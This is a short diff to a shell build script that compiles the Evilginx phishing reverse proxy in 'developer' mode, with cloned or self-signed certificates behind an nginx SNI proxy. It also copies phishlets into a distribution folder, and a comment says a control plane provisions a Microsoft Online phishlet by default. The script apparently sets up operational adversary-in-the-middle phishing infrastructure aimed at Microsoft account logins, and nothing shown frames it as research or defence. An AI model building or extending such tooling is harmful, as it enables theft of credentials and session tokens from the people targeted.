@@ -78,7 +78,9 @@ if [[ -n "$EVILGINX_SRC" ]]; then
         apt-get install -y golang-go
     fi
     pushd "$EVILGINX_SRC" >/dev/null
-    go build -o "$EVG_DIST/evilginx" .
+    # developer build: serves self-signed/cloned certs (no Let's Encrypt),
+    # which works reliably behind the nginx SNI proxy with autocert off.
+    go build -tags developer -o "$EVG_DIST/evilginx" .
     popd >/dev/null
     # microsoft-online.yaml is what the control plane provisions by default today
     cp "$EVILGINX_SRC"/phishlets/*.yaml "$EVG_DIST/phishlets/" 2>/dev/null || true
